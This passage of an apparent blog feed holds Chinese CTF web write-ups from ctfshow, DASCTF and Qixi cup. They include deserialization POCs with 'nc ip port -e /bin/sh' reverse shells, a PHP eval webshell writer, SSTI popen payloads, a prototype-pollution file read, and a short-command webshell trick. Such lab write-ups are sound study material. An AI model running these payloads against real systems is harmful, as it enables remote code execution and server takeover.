class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;adapter=<span class="keyword">new</span> Local();</span><br><span class="line"><span class="keyword">$this</span>-&gt;autosave=<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file=<span class="string">&quot;1.php&quot;</span>;</span><br><span class="line">array_push(<span class="keyword">$this</span>-&gt;cache, <span class="string">&#x27;&lt;?php $a=$_POST[1];eval($a);?&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$adapter</span> = <span class="keyword">new</span> Adapter();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$adapter</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大概思路<br>寻找_destruct发现<br><img src="https://img-blog.csdnimg.cn/3ae82882bc3d43cda09d260ad778875a.png"><br>跟进save发现<br><img src="https://img-blog.csdnimg.cn/0157c18be72a47f69d31404179395e24.png"><br>在这里我们看到write函数<br>其中只要file和content两个参数可控，就应该可以写文件<br>跟进getforstorage发现<br><img src="https://img-blog.csdnimg.cn/1676ccd4cf494d7795a1f90f1509aeff.png"><br>可以发现我们将恶意代码放给cache属性，他就会json加密并赋给content，所以content可控，由于file本身就是属性，所以file也可控<br>接下类就是查看write函数<br>全局查找write函数可以发现local类中有write函数，同时还有file_put_contents函数<br><img src="https://img-blog.csdnimg.cn/f8aac41f916747b4ba30bd53bc4e7143.png"><br>分析write函数发现location是可控的<br>因此写文件成立<br>利用上面的poc可以写文件且写入成功<br><img src="https://img-blog.csdnimg.cn/1d03c1743c014753abb6a70c9d47bf78.png"><br><a href="https://juejin.cn/post/7069307571483443231">网上其他payload</a></p><h1 id="web829"><a href="#web829" class="headerlink" title="web829"></a>web829</h1><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User(<span class="string">&quot;nc ip port -e /bin/sh&quot;</span>);</span><br><span class="line">        ByteArrayOutputStream bo = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oo = <span class="keyword">new</span> ObjectOutputStream(bo);</span><br><span class="line">        oo.writeObject(user);</span><br><span class="line">         <span class="keyword">byte</span>[] bytes = bo.toByteArray();</span><br><span class="line">        bo.close();</span><br><span class="line">        oo.close();</span><br><span class="line">        String userData  = <span class="keyword">new</span> String(Base64.getEncoder().encode(bytes));</span><br><span class="line">        System.out.println(userData);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.ctfshow.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">3254536114659397781L</span>;</span><br><span class="line">        <span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">            in.defaultReadObject();</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">this</span>.username);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-830"><a href="#web-830" class="headerlink" title="web 830"></a>web 830</h1><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User(<span class="string">&quot;cyxin&quot;</span>);</span><br><span class="line">        user.secret = <span class="string">&quot;nc ip port -e /bin/sh&quot;</span>;</span><br><span class="line">        ByteArrayOutputStream bo = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oo = <span class="keyword">new</span> ObjectOutputStream(bo);</span><br><span class="line">        oo.writeObject(user);</span><br><span class="line">         <span class="keyword">byte</span>[] bytes = bo.toByteArray();</span><br><span class="line">        bo.close();</span><br><span class="line">        oo.close();</span><br><span class="line">        String userData  = <span class="keyword">new</span> String(Base64.getEncoder().encode(bytes));</span><br><span class="line">        System.out.println(userData);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.ctfshow.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">BaseUser</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.username;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.ctfshow.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseUser</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">9058183616471264199L</span>;</span><br><span class="line">    <span class="keyword">public</span> String secret=<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web831"><a href="#web831" class="headerlink" title="web831"></a>web831</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        BaseUser user = <span class="keyword">new</span> BaseUser();</span><br><span class="line">        user.secret = <span class="string">&quot;nc ip port -e /bin/sh&quot;</span>;</span><br><span class="line">        ByteArrayOutputStream bo = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oo = <span class="keyword">new</span> ObjectOutputStream(bo);</span><br><span class="line">        oo.writeObject(user);</span><br><span class="line">         <span class="keyword">byte</span>[] bytes = bo.toByteArray();</span><br><span class="line">        bo.close();</span><br><span class="line">        oo.close();</span><br><span class="line">        String userData  = <span class="keyword">new</span> String(Base64.getEncoder().encode(bytes));</span><br><span class="line">        System.out.println(userData);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF X CBCTF 2022九月挑战赛（web部分）</title>
      <link href="/2022/09/24/DASCTF%202022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B%EF%BC%88web%E9%83%A8%E5%88%86%EF%BC%89/"/>
      <url>/2022/09/24/DASCTF%202022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B%EF%BC%88web%E9%83%A8%E5%88%86%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="dino3d"><a href="#dino3d" class="headerlink" title="dino3d"></a>dino3d</h2><p><img src="https://img-blog.csdnimg.cn/98371c199af54aafb1365732f8318399.png"><br>在做游戏的时候发现存在check.php，或者直接扫目录也可以发现<br>这里得到来源，看发包格式<br><img src="https://img-blog.csdnimg.cn/40855bdf301c4a53a045e07c7ee46dd6.png"><br>跟踪sn函数看其从哪里调用发现<br><img src="https://img-blog.csdnimg.cn/caffd334ee6349eab79d4c3b197963bb.png"><br>可以发现e是分数，t为checkcode，跟踪checkcode可以得到<br><img src="https://img-blog.csdnimg.cn/bf7cc6eda28d4a29a5e24144261ebb5b.png"><br><img src="https://img-blog.csdnimg.cn/ffa80e3c30244b5a92af9e43c1ea45e9.png"><br>拼接得到checkcode为DASxCBCTF_wElc03e<br>tm的参数是时间戳、score是分数<br>从而可以构造包进行发包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node4.buuoj.cn:25299/check.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span>():</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;score&quot;</span>: <span class="number">1000000</span>,</span><br><span class="line">        <span class="string">&quot;checkCode&quot;</span>: md5(<span class="string">&quot;1000000DASxCBCTF_wElc03e&quot;</span>.encode()).hexdigest(),</span><br><span class="line">        <span class="string">&quot;tm&quot;</span>: <span class="built_in">int</span>(time.time())</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url, data = data)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(getFlag())</span><br></pre></td></tr></table></figure><h2 id="web-Text-Reverser"><a href="#web-Text-Reverser" class="headerlink" title="web Text Reverser"></a>web Text Reverser</h2><p><a href="https://blog.csdn.net/solitudi/article/details/107752717">ssti一些简介</a><br><img src="https://img-blog.csdnimg.cn/1fd9f92d16c3409988f0614fc735d68f.png"><br><img src="https://img-blog.csdnimg.cn/8bef4c24fccd44f0b9c8e68d111cd62e.png"><br>之后尝试构造paylaod<br>获得子类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">output = <span class="string">&#x27;&#x27;&#x27;&#123;% print &quot;&quot;.__class__.__bases__[0].__subclasses__()%&#125;&#x27;&#x27;&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure><p>或者利用这个<br>可以更换””为’’进行尝试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a =<span class="string">&#x27;&#x27;&#x27;&#123;% print &quot;&quot;.__class__.__mro__[2].__subclasses__() %&#125;&#x27;&#x27;&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p>发送反转后的payload 得到类列表，然后将返回的列表内容复制进脚本寻找可利用的类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;class &#x27;type&#x27;&gt;...&lt;class &#x27;unicodedata.UCD&#x27;&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line">allList = []</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&quot;&gt;&quot;</span>:</span><br><span class="line">        result += i</span><br><span class="line">        allList.append(result)</span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&quot;n&quot;</span> <span class="keyword">or</span> i == <span class="string">&quot;,&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result += i</span><br><span class="line">        </span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> <span class="built_in">enumerate</span>(allList):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;os._wrap_close&quot;</span> <span class="keyword">in</span> v:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(k)+<span class="string">&quot;---&gt;&quot;</span>+v)</span><br><span class="line"><span class="comment">#返回结果:132---&gt; &lt;class &#x27;os._wrap_close&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>之后就是利用popen进行命令执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span> <span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()%&#125;</span><br></pre></td></tr></table></figure><p>这里过滤了很多读取文件的命令，可以利用 nl的绕过过滤读取文件（后测试用grep，rev，tail等命令也可以读取flag）</p><h2 id="web-cbshop"><a href="#web-cbshop" class="headerlink" title="web cbshop"></a>web cbshop</h2><p><a href="https://blog.csdn.net/xiaoxiaocainiao_/article/details/126970812">原型链介绍</a><br><img src="https://img-blog.csdnimg.cn/855c7c0a92a34c728284c6c1ebcc2ac1.png"><br>拿到题目审计源码<br>发现<br><img src="https://img-blog.csdnimg.cn/755c98d5bc354fd3993fadec174e5134.png"><br><img src="https://img-blog.csdnimg.cn/a207198cde3e40f58bedf80a1f6254e8.png"><br>于是得到admin密码（将😀admin😀放入浏览器）<br><img src="https://img-blog.csdnimg.cn/046eb6b49cb14875abbc3415fcf46e7d.png"><br>得到密码后发现还不行，于是继续审计发现还需要token<br><img src="https://img-blog.csdnimg.cn/c340534731a144ec99709de76b4a0b66.png"><br>但是在其他地方根本就找不到token通过仔细观察发现<br><img src="https://img-blog.csdnimg.cn/9db90d10d9d24445bd94dba64f37e56c.png"><br>存在原型链污染漏洞<br><a href="https://cloud.tencent.com/developer/article/1841463#:~:text=%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%80%9A%E5%B8%B8%E4%BC%9A,%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E7%AD%89%E6%BC%8F%E6%B4%9E%E3%80%82">原型链污染漏洞讲解</a><br>根据上面讲解的比对发现存在CVE-2021-25928<br>通过分析发现</p><blockquote><p>product 对象是我们post的json数据转化而来，我们完全可控，而这里如果我们的 user.username 是 __proto__，这样的话就会将 product 对象合并到 order 的 <strong>proto</strong> 中，而user 和 order 的原型都是 Object ，是同一个原型，当 product 中构造 token:true 时，user.token 访问为 true即只需要登录admin后修改用户名为 <strong>ptoto</strong></p></blockquote><p>于是修改用户名为__ptoto__，之后构造product<br>这里由于把flag给过滤了，需要绕过<br>程序会将json转化为对象<br>json中将name的值修改为一个对象 {} 发送可以看到这样的报错</p><blockquote><p>TypeError [ERR_INVALID_ARG_TYPE]: The “path” argument must be of type string or an instance of Buffer or URL. Received an instance of Object</p></blockquote><p>可以发现传入的参数不只是字符串，也可以是一个 URL 实例 本地测试发现<br>使用URL 实例可以正常读取文件，将 flag 进行url编码从而绕过，那构造一个URL对象即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;href&quot;</span>: <span class="string">&#x27;file:///fl%61g&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;origin&quot;</span>: <span class="string">&#x27;null&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;protocol&quot;</span>: <span class="string">&#x27;file:&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;host&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;hostname&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;port&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;pathname&quot;</span>: <span class="string">&#x27;/fl%61g&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;search&quot;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;searchParams&quot;</span>: <span class="string">&quot;URLSearchParams &#123;&#125;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;hash&quot;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;id&quot;</span>:2,</span><br><span class="line">    <span class="string">&quot;token&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>七夕杯（web部分）</title>
      <link href="/2022/08/06/ctfshow%20%E4%B8%83%E5%A4%95%E6%9D%AF/"/>
      <url>/2022/08/06/ctfshow%20%E4%B8%83%E5%A4%95%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><p>拿到题目 让执行字符长度小于7的命令<br>利用大佬博客<br><a href="https://blog.csdn.net/nzjdsds/article/details/102873187">大佬博客</a><br>得到payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;7\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">ls -t&gt;0</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure><h2 id="easy-calc"><a href="#easy-calc" class="headerlink" title="easy_calc"></a>easy_calc</h2><p>本题考察include函数包含日志</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(check(<span class="variable">$code</span>))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;$result=&#x27;</span>.<span class="string">&quot;<span class="subst">$code</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$result</span>);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">&amp;<span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$num1</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;num1&#x27;</span>];</span><br><span class="line">    <span class="variable">$symbol</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;symbol&#x27;</span>];</span><br><span class="line">    <span class="variable">$num2</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;num2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$num1</span>) || !<span class="keyword">isset</span>(<span class="variable">$num2</span>) || !<span class="keyword">isset</span>(<span class="variable">$symbol</span>) )&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/!|@|#|\\$|\%|\^|\&amp;|\(|_|=|&#123;|&#x27;|&lt;|&gt;|\?|\?|\||`|~|\[/&quot;</span>, <span class="variable">$num1</span>.<span class="variable">$num2</span>.<span class="variable">$symbol</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^[\+\-\*\/]$/&quot;</span>, <span class="variable">$symbol</span>))&#123;</span><br><span class="line">        <span class="variable">$code</span> = <span class="string">&quot;<span class="subst">$num1</span><span class="subst">$symbol</span><span class="subst">$num2</span>&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看到源码后开始传参<br>payload<br><img src="https://img-blog.csdnimg.cn/50c0e650ca304d1a9a2a6263f69ec699.png"></p><h2 id="easy-cmd"><a href="#easy-cmd" class="headerlink" title="easy-cmd"></a>easy-cmd</h2><p>直接利用nc进行vps弹shell从而得到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>强网杯（部分）</title>
